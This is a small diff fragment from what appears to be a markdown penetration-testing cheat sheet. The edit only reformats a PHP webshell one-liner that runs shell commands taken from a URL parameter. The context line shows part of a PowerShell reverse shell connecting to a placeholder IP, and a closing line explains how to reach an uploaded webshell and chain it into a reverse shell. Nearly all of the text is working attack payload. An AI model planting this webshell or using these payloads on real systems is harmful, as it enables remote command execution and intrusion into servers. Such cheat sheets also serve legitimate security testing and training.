@@ -405,7 +405,9 @@ powershell -c “$client = New-Object System.Net.Sockets.TCPClient(‘<ip>’,<p
 ````
 
 ### PHP Webshell one-liner:
-`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
+```php
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+```
 
 need to trigger rev-shell -> find upload folder -> add to url-path `http://<ip>/<path>/php_shell.php?cmd=<rev_shell>`
 
